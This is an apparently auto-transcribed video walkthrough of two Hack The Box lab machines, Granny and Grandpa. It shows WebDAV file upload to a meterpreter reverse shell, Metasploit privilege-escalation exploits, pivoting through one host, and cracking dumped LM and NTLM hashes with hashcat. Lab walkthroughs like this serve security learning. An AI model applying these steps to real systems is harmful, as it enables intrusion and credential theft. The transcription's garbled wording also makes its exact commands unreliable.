 hey guys what's going on this is ipsec and we're going to be doing two boxes today both Granny and Grandpa I didn't do granny back when it got retired because its exploit path is so similar to Grandpa you can exploit it literally with the same commands so instead of doing a boxing granny and potentially spoiling it I decided to wait until Grandpa got retired and we're gonna do something special and pivot you don't have to Pivot but we're gonna use IP tables to block access to Grandpa and force us to Pivot through granny to get to grandpa just as a learning exercise so let's jump in and see what we find with Granny but before we do anything let's block access to Grandpa Grandpa's IP is 10 10 10 14 and Granny's IP is 10 10 10 15. so we're gonna do iptables Dash capital L to list all the rules then we do iptables Dash capital A to append to the output rule because we're going to block traffic going out of our box gonna do Dash D and specify the destination IP which is 10 10 10 14 and then Dash J which is going to jump to what chain we want it to and we're going to say hey just drop this packet before I hit edit I'm going to Ping the IP address so you can see it's actually able to get there and then as soon as we hit enter we can no longer get to Grandpa's IP now that that's out of the way let's just end map so nmap-sc for Save script SV enumerate version output all formats and let's call it granny this time around just in case we do another end map down the road and then the IP address of Granny which is 10 10 15. I have already ran this so let's just look at the results if we look at granny.nmap we see only Port 80 is open and it has a web dev server IIs 6.0 and we know this is 2003 because if we just Google for IIs versions it should tell us right off the bat 6.0 is for Windows Server 2003 so we know this is a really old operating system off the bat and it's running webdav scan so webdav is enabled the first thing I'm going to do there is well before we do anything let's set up our enumeration script so we have things going in the background while we do this I'm going to go to opt door buster or not dirtbuster go Buster and this is just a door buster program that's command line and works well if you want to know how to install this I'd recommend going to the haircut video so go Buster Dash H to see the flags we're going to do Dash W for path to the word list so user share word list Go Buster and then directory list 2.3 Dash medium Dash U and then URL so HTTP 10 10 10 15 and dash t for Threads and we're gonna do 20. so name this to Go Buster the other thing we may want to do is just run a nicto scan so nickto Dash is it URL I think it'll complain if it's not 10 10 10 15. I don't run nicto that much as you can tell uh Dash config I could have swore I could have just outputted that dodash Capital Ace to view the full help grab Dash I on URL less I could as well as just nickto HTTP 10 10 10 15. is a dash host that's stupid so we got nickdo running eventually thing I wanted to do is just do a dab test and we can look at the options Dash URL and then http 10 10 10 15. and it's going to do some basic web dev type enumeration and we see it did a bunch of puts and succeeded and tried to execute like PL JSP CFM which is called Fusion html text jhtml PHP it only accept uh succeeded on HTML and text so let's see what this actually says HTML put via DAV test so let's see exactly what devtest is doing we go into a burp let's create a proxy listener find the airport 80 and we're going to redirect it to her's 10 10 10 15 on Port 80. so now when I go to localhost uh intercept is on We Now navigate to the web server we want because Dev test doesn't have a proxy option so now I can do DAV test on localhost and then we go into burps history we can see all the commands devtest is running so here's the put syntax we see it's just a HTTP put instead of git here they put put and the file name and then text so let's try something Ctrl R send that to repeater and we're just going to put ipsec dot HTML and we're going to put this is a test says created and if we go to ipsec.html we get the file creation so the next thing to do is try to figure out which file extension will be executed it's saying it's powered by asp.net so this will be aspx files so what I'm going to do is do msf Venom and we'll do Dash H and grep for uh is it Dash p and this will list all the payloads LS payloads and just grab for Windows and we're going to want to use the windows meterpreter reverse TCP most likely so windows interpreter reversed ECP so that's the payload we want to use and then we want to list formats and I think we can just do dash dash list formats and see if this supports aspx uh help formats so we see the formats are ASP aspx aspx exe we're just going to want to do aspx so msf Venom Dash p Windows meterpreter reverse TCP L host because we got to do our IP address which is 10 10 14 4 I think 10 10 14 4 yes uh uh that screwed up then L Port is equal to let's do four four let's just do it doesn't matter one three three seven then we gotta do Dash F and we're going to specify aspx and we create this payload we're going to copy this go back here paste it in so we've uploaded our aspx payload let's just see what's going on see all the contents of this so we know the server is not executing it so it's not executing aspx through the HTML extension we have to upload this as a aspx file before we do that let's just go and create a msf console session msf Handler so if we do get code execution we get a shell right away and know that because right now we're not listening on the port so we have no idea if we ever get that show so use exploit multi-handler set L host is equal to ton zero and we'll do that twice because for some reason sometimes if you don't do it twice it doesn't specify to that interface weird bug set L port to 1337 set payload to Windows interpreter reverse DCP run that and we see a listener is listening on 10 10 14 4 on Port 1337 which is what we had created with msf Handler so the next step is to go back into book and try changing this to aspx to see if we can upload and we get a forbidden you do not have permission to execute this program so can't upload aspx if we go back to our nmap scans we see allowed methods options Trace git head delete copy move prop fine prop patch search call lock unlock and how it's doing this is literally just doing options on the web server and we probably need to get rid of this and that maybe it's just option blank line options there we go image tells us what options it's doing but the move option sounds interesting so let's go to Google real quick and do HTTP move the move method because we want to see how to do this so it says the request move the file name and add a destination in the header to where you want the location to be so let's do move ipsec dot HTML and destination to be ipsec Dot aspx delete this click go uh bad gateway slash ipsec dot aspx was trying to register a hostname it was 204 no content we'll see if the file exists now don't get a 404 error and if we go to Metasploit session one has been opened so we finally have our first session with Granny the first thing we'll do is search for suggestor and see what exploits are there or before we do that we can confirm who am I a shell and with NT Authority network service background that was Ctrl Z use exploit suggestor and set session to one and then run this and this is just going to gather a bunch of potential local exploits for this box and it shouldn't take too long but there's going to be one issue and I chose to go into shell and do who am I instead of doing get uid to highlight what issue is about to happen if this ever finishes so while that's going this is when we decide to look at go Buster to see what directories on the web server doesn't look like anything just images private go to nickto and we can see what nickto says we see is 6.0 put allows clients to save files delete you can delete files allowed methods looks like it's created by front page based upon this file so various things that nickner says but we have the exploit list now and let's just try ms-16016 webdav because well we've exploited web dev so let's try to prevent through webdav so use this show options set session to one set L host to ton zero run this and we see the TCP Handler on 192.168 so that's why I do L host on 0 twice and it fixes and for some reason it worked right away I think I was not expecting that let's try uh verify privileges manually we'll use get uid and interpreter verify exploitation the get you ID is probably going to fail but I want to do something before we fix that so let's use a different exploit no it's not so assessment i1 get uid Okay so the bug I was expecting did not happen however we um may have not got a shell so something could be wrong with the server because I think ms-15 should have worked uh let's try this one run this again and we'll see if this exploit works exploitation successful so sessions Dash i1 get uid in with system so ms-14070 did work I was expecting ms-15 to give us a callback I'm not exactly sure why it didn't but we have now elevated two system credentials it's a Windows 2030 box it's unpredictable a lot of things could happen but Bing system now let us try to access Grandpa if we do shell we can do a ping on 10 10 10 14. we can get there from this box but if we try to get there from our box we can't so what we're going to do is background this and do a search for sucks and set up a socks proxy so auxiliary server sucks for a show options it's going to listen on zero zero zero put 1080 that is fine and then we're going to I think it's just route add 10 10 14 1. okay so what I just did there was tell Metasploit on this IP address send it through Session One so if we go to a box and edit proxy chains we can do a socks 4 proxy on 127.001 on put 1080. so now when we do proxy chains uh nc-v 1010 oh we can just curl oh error parameter is incorrect I wonder if this is because of Ip tables I would do http so I was not expecting that let's just go into Metasploit again and search for scanner one of these should be a TCP scanner to do a point scan through Metasploit I've never actually demoed a pivot this way with iptables blogging something on the local subnet so not sure if this is going to work probably something I should have tested before I did the video uh uh I'm not sure where this is so I'm going to do a cheap way to find scripts and we'll just do locate that and grab Dash I TCP or scan oh I did or not and I even said that out loud as I typed it okay auxiliary scanner put scan TCP that's what we want session one closed so let's re-exploit session two opened we'll do yeah that still works ms14 set session two run I'll host run okay session three route add 10 10 10 14 3. so use Missouri scanner port scan TCP show options set ports to 80 set our host to 10 10 10 14. run and we see it is open so why isn't my proxy chains working let's just try one last thing Sox 4A that's running that's stat almp graph list 1080. okay we have that running V let's see proxy chains socks four curl that could also just be oh there we go no 10 10 14 is blocked boxychains that could just be the error message on grandpa so if we do IB tables dash dash flush and curl HTTP 10 10 10 14. yeah it was working this whole time so wait I want to just block 10 10 10 15. that should have been 14. this view is filled with mistakes okay okay everything works so proxy chains is now configured to go through and work and if we just do this we should get a 404 no but I guess that's expected and if this is all confusing just follow the instructions I did back to set up proxy chains and it was all working to begin with but now we can do a dab test on http 10 10 10 14. and we see a bunch of messages Dev test summary did not like proxy chains I think that one succeeded but I wish I didn't say all this but Grandpa's webdav is not fully open if that makes sense as in we cannot just write to this directory server so what we're going to do is go to Google real quick because I forgot the cve but there was a IIs 2013 webdav 2017. and that may pull it up uh exploit so I just remember this one because it's odd seeing a cve come out in year 2017 against a end-to-life software which is Windows server 2003. so this is a SC storage path from URL overflow for Windows Server 2003 webdav servers so what we're going to do is search Metasploit for 7269 and we get the exploit show options set our host to 10 10 14. set lhost to on zero do that twice and I'm going to set up Wireshark so we can do a packet capture to show we're not actually communicating with 10 10 14. we're going through 15 to get to 14. so let's listen on time zero run and a source and destination let's see I should have just went through huh Route 10 10 10 14 Session three maybe it's not used to doing routes this way because this should have just went straight to 10 10 15. uh yeah it is oh so what happened was and I'm sure we can find it here if I P tables didn't block us let's do source 10 10 14 4. 10 10 15 10 10 14. so we had the server called back to us but we couldn't reach back out to it so exploit looks like it was successful but because we couldn't communicate back to it we didn't get a shell so what we have to do is just set lhost to 10 10 15. and this is the IP address of grandma and metasploits can be smart enough to do all the port magic of port forwarding magic before this session back to our console so if we run this now or exploit Handler fail to bind uh route let's do set output to 50 32 1. found a bind fifteen route session three get uid and we assist them so I'm not exactly sure why that's not working but generally that is how you would do it maybe there's a firewall on this box that is preventing us and I guess I should have looked up all the commands to disable the firewall but this is Windows Server 2003 and I don't know there's off the top of my head so I guess we're just going to drop IP tables and not pivot that is how you would pivot but that's not working so I tried set lhost ton zero do that twice and run exploit complete but no session was created show options route Del 10 10 10 14. rep removed let's try running this again let's just completely exit from escalate and start over because this exploit definitely should work set our host to 10 10 10 14. but that's fine I'll host to turn zero do that twice run if this doesn't work we're gonna have to revert the Box nope there we go and it's dead try again this box definitely seems to be in a odd state so it says and choose opened there we go if we get uid and we get anti-authority system if you ever do get uid and that doesn't return anti-authority system chances are you have a bad token so run PS and migrate to a process that you think you can access so maybe that's SV host so you just do migrate 668. so background this uh let's do suggestor or it was what ms-14 let's just try this export again show options set session two set L host tone 0 do that twice run and we'll see if we get there we go session's already elevated so we were already root apparently session I2 get uid and system so was I system then yeah I was so this exploit just gave me a system on the box to begin with I thought that said network service but we were system so the last thing we can show off is using port forward to access a service so if we and mapped Grandpa we would see only Port 80 is open so if we do SMB client which is trying to use port 445 to 10 10 10 14. try to mount the C vulture which is just the root of the C drive pass by the user as administrator this doesn't matter because I can't type and the port is open support open on 10 10 10 14. is it open SMB client may just ask for the passer before trying to connect so 10 10 10 14 1.445 and it doesn't look like the port's open so let's do dash n for don't resolve DNS and .445 so the port is closed on 10 10 10 14. SMB clients just always ask for the password so what we want to do is do put forward we do Dash H we can say okay to put to listen on is going to be 445 the put to connect to is 445. and the remote host is going to be 127001 I think that syntax is correct we have to add so whatever I'm doing is a local TCP relay was created so if I go into my bash do netstat alnp drop 445 Metasploit is listening on Port 445 and what it's doing is forwarding that to the session on localhost 445. so we can now bypass the firewall by Dash p445-n we'll do save scripts this shouldn't take too long on localhost and it's going script scan almost done but that's allowing me to use my motopia session to access the grandpa machine on a port that is not listening externally come on script finish so while that goes eventually we'll need a password so I'm just going to do the hash dump and this is Windows 2003 and it uses landman hashes so this is the LM hash this is ntlm LM is god-awful so what they did well they as in Microsoft to create these hashes I think they divided the password up into two uh seven characters pieces and uppercase them both so this is actually two hashes if we divide this in half this would be the first half of the password this will be potentially the second half if it's not 14 characters it may be 16. I may get the numbers off they just Pat it with um I think zeros are blank characters or something but that's why you see this aad 3B because this password there's no password set here and we see this string aad 3B repeats about halfway through the hash because again this one hash is two hashes so what they did was mean you only have to crack the password twice and it's going to be up to seven characters it's really fast to crack lmhash so we're just going to do LM hashgraph and input the hash here two new hashes non-database so it did not wasn't there let's go back the one that May Crack faster Extinction not found please wait a bit it's actually funny because I guess this password is randomly generated this is a different one than I have my notes so I guess we can try lacus is this user in any database no but that password is going to be a random password and then we use ntlm to get the casing and it'll make sense if I ever decrypt this so that's lackous this will be administrator my h not found so what I'm going to do is we will wait a bit and it should crack and one of these sites soon so yeah I guess well the sites try to crack it we can just crack it I normally don't crack LM hashes because I don't have the rainbow tables but it's a super quick pass to crack you probably don't need rainbow tables so this would be a learning exercise for me as well as you so let's go back to Metasploit get a hash we'll do administrator SSH uh V let's call this jeepa dot LM hash and then we'll do hash cat move this into hashcat [Music] LM so it's going to be mode 3000 uh uh brute force is attack method three so we'll do dot slash hash cat Dash M what'd I say 300 3000. 3000 Dash A3 GPA dot LM hash and we said it's seven characters so that's one two three one two three four five six seven so we're gonna crack LM hash up to seven uppercase characters let's see how quick this goes and we see whoa that was fast so already cracked the entire space of seven characters we got one out of two and you see it's separated LM hash into two different hashes so the reason why it didn't get both of them is because the other one's not seven characters which is good for us if the password is longer than 14 characters and LMS hash it just drops all the additional characters so if it was a 16 character hash we wouldn't be able to recover the full password out of LM hashes so now I'm just doing six characters and recovered one out to we're gonna do four characters uh this is five and we just got the second half that is how fast it is to crack LM hashes and why it should always be disabled so if we do dash dash show uh do we have to actually specify mode 3000 yeah so we get both halves of the password so we got that and we got this so I believe the hashtag was C7 it would make sense because that's the longer one yes session two died so we have to re get this session uh let's see do I have L host that's what I want run this there's actually created try again I don't know why this is so flaky come on my VPN connection up yeah so what I'm going to do is revert the box so pausing the video so the box has been reverted let's try again and we get session three right away almost instantly so sometimes the Box just needs to be kicked lesson learned so if you're doing these boxes ever think you're doing something correctly and it's just not working try reverting the Box come on give me my session get uid this is what I was expecting to happen when I run git uid so if we go and do the exploit suggestor uh this is session three and I know all you want to do is be like I just want to see the um cracking stuff so while that runs we can V japa dot ntlm hash copy both this uh copy that this I'm also going to type it ihrn w-u-i-e-n-d-k-e and having it in all uppercase and all lowercase I find works better when you do the brute forcing because hashcot's only going to do a toggle five and toggle the casing on five of the characters so that's when you just manipulate the dictionary and that's the easiest way so let's hashcat I think it's going to be 1000 for ntlm but let's just grab real quick one thousand damn 1000 uh GPA Dot ntlm hash that's the hash the dictionary oh no mvgpa dot ntlmhash that is definitely not the hash that is a password so GPA dot dict and we'll have to get the password so let's escalate back to root and I'm going to laugh at this change the password on us because I just reverted the Box I just thought of that uh use test this one out exploit and we get oh it's three and we get this weird error this isn't the exploit failing to attack the Box this is just we don't have enough privilege and we can see even if we do the correct IP so let's do a session Dash i3 PS and we are probably I'm guessing in this process so we're going to migrate to 1800 DAV C data migrate 1800. 1848 so yeah we were definitely in this process migrate successful if I did go get uid I now have the tokens so running this exploit I no longer get that error and this works and we get session four has opened session four has opened so hashtomp we do indeed have a different hash that is infuriating so you're going to see hashcad again we're going to do gpud.lmhash paste that uh Attack Mode 3000 one two three four five six seven recovered one get rid of two so now we're cracking for five characters uh crack four crack four six and we got it so now we can do a dash dash show to show the password and it's going to be this so GPA Dot dict let's type that in lowercase okay type that right so now dot slash hash cat um what was ntlm one thousand gpu.dict uh we need a hash and tlm Ruby grab the ntlm hash 1000 GPA Dot ntlm gpa.dict Dasha and we'll do rules toggles five and this toggle is up to five K switches and we should be able to get the password now because again LM hash uppercases everything and ntlm is not so we recovered one password and there is the password for administrator so let's go back and do a port forward rule and if you're curious how I type so quick that's control R and You Begin typing the command and it autofills that's for bash and pretty much everything in Linux and I think Powershell too so we created that relay so when we do SMB client on localhost it's going to forward it to Grandpa and I'm going to type the password and we get in so I hope you enjoyed that let me uh I'm trying to think yeah we'll go try and pivot one more time so let's see if we get this IP tables thing working so iptables Dash l uh we'll block access to Granny so drop 10 10 10 15. granny has been blocked so let's go back into Ruby which is Metasploit background Metasploit route add 10 10 10 15. on session four okay so we're going to do the let's just search for webdav and there is one upload one this exploit is going to do what we did manually and use the put into um move so use that exploit show options set our host 10 10 10 15 set L host 10 10 10 14. and let's see if this works yeah it worked just fine for some reason it did not exploit resource not found let's try running that again I wonder if grammar needs to be reverted to uploading executing deletion failed hmm I wonder if my computer is aware of that and my IP tables is somehow blocking me because again never did pivots this way wait why does it say my Handler there yeah that was the weird bug we set L host because I noticed it was setting it on ton zero still instead of Grandpa which is 10 10 14. and it fails so let's go back and do sessions I4 put forward uh Dash H and try to manly do this so put forward Dash capital l we'll do one three three seven and the port to connect to will be 1337 and the host will be 10 10 14 4. for us thought that was correct oh Dash p motor host 15. I forget the syntax to do this so let's see Dash capital L The Local Host to listen on I hate how they have different options so maybe it's to Google uh put forward local let's see Dash capital l they give syntax options match case on go down they do not wait I wasn't doing add oh my God so you must specify a local Port remote host and remote port so I think I had it right the very first time I did this so we got the remote host we got the remote port and we got the local port and we just crashed interpreter awesome so I guess we'll have to do a different video on pivoting when it's not on the same subnet and a bit easier to do so hope you enjoyed the video take care guys until next time